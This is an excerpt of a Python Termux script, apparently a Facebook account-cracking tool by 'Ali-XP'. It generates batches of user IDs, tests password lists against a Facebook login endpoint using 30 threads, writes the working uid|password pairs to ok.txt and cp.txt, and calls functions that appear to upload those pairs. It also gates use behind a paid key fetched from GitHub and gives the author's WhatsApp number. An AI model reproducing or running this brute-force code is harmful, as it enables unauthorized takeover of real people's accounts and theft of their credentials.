...
def helpnote():
	print("%s [*] FOLLOW ME ON FB THEN YOU UPDATES ABOUT THIS TOOL  :)"%(G))
	subprocess.check_output(["am", "start", "https://www.facebook.com/profile.php?id=100010399241489"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/profile.php?id=100010399241489")
...
def notice():
	...
	runtxt("\n\033[0;97m YOU ARE NOT PREMIUM USER ")
	runtxt("\033[0;97m SEND THIS KEY TO ADMIN >> %s%s"%(G,basesplit))
	runtxt("\033[0;97m ADMIN WHATSAPP >> +923155912839")
	subprocess.check_output(["am", "start", "https://www.facebook.com/profile.php?id=100010399241489"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://raw.githubusercontent.com/ALI-XP/aprvvv/main/Max.txt').text
			if basesplit in plr:
				key = basesplit
...
\x1b[1;97m------------------------\x1b[1;97m------------------------×
\033[1;91m[!]\033[1;97m Author \x1b[1;97m  : \x1b[1;97m          Ali-XP
\033[1;91m[!]\033[1;97m Facebook\x1b[1;97m:  \x1b[1;97m      Ozan Aly
\033[1;91m[!]\033[1;97m Version\x1b[1;97m : \x1b[1;97m          1.0
\x1b[1;97m------------------------\x1b[1;97m------------------------×
  """)
	...
	def fbtua(self):
		...
		xx = 999999999
		idx = "100000"
		limit = int(input("\033[0;97m [+] ENTER LIMIT \033[0;97m(5000 MAX): \033[0;97m"))
		if (limit)>5000:
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;97m]"%(Y,listpass))
	...
	def old4_7(self):
		...
		limit = int(input("\033[0;97m [+] ENTER LIMIT \033[0;97m(10000 MAX): \033[0;97m"))
		if (limit)>10000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [XIDI] : %s/%s -> \033[0;91m [ XIDI-OK:%s ]- \033[0;97m[XIDI-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;91m[XIDI-OK] %s|%s\033[0;91m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [XIDI-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;97m[XIDI-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [XIDI-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
